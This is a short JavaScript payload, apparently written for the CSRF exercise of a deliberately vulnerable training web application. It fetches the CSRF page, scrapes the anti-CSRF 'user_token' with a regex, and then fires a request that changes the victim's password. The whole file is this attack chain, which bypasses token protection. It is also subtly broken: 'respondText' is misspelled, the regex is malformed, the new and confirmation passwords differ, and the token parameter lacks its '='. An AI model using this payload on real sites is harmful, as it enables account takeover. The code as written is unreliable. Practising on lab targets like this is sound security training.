var req = new XMLHttpRequest();
req.onload = handleRespond;
req.open('get','/vulnerabilities/csrf/',true);
req.send();
function handleRespond() {
    var text = this.respondText
    var regex = /user_token\'value\=\'(.*?)\'|?|?>/;
    var match = text.match(regex);
    var token = match[1];
    var ChangeReq = new XMLHttpRequest();
    ChangeReq.open('get','/vulnerabilities/csrf/?password_new=mamaq&password_conf=mama&Change=Change&user_token'+token, true);
    ChangeReq.send();

        };
